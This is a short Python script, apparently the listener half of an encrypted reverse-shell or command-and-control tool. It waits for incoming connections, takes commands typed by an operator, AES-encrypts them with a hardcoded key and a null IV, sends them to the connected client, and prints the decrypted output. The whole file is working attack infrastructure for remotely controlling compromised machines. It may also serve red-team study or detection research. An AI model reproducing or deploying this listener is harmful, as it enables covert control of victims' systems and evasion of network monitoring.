import socket
from Crypto.Cipher import AES
from Crypto.Util import Padding
from hashlib import sha256
import sys

secret_key = b"lemmyz"

def encrypt(plaintext: bytes, key: bytes) -> tuple:
    # Ensure that the key is 32 bytes long
    hashKey = sha256(key).digest()
    k = sha256(key).digest()
    # IV will just be 16 null bytes
    iv = bytes([0] *AES.block_size)
    # Ensure plaintext is padded to AES block length (16 bytes)
    plaintext = Padding.pad(plaintext, AES.block_size)
    # Encrypt with AES in CBC mode
    cipher = AES.new(hashKey, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext

def decrypt(ciphertext: bytes, key: bytes):
    hashKey = sha256(key).digest()
    iv = bytes([0]* AES.block_size)
    cipher = AES.new(hashKey, AES.MODE_CBC, iv)
    decrypted = Padding.unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

def main():

    if len(sys.argv) < 3:
        print("[-] Usage: listener.py <ip_addr> <port>")
        exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((host, port))
    listener.listen()
    print(f"Listening for incoming connections on {host}:{port}...")

    while(True):
        clientSocket, clientAddress = listener.accept()
        print(f"Connection received from {clientAddress}")
        cmd = input("cmd> ")
        cmd = cmd + '\n'
        cmdRequest = cmd.encode()
        cmdRequest = encrypt(cmdRequest, secret_key)
        print(f"Sending encrypted command: {cmdRequest}")
        clientSocket.sendall(cmdRequest)
        cmdOutput = clientSocket.recv(1024)
        plaintext = decrypt(cmdOutput, secret_key)
        print(plaintext.decode())

if __name__ == "__main__":
    main()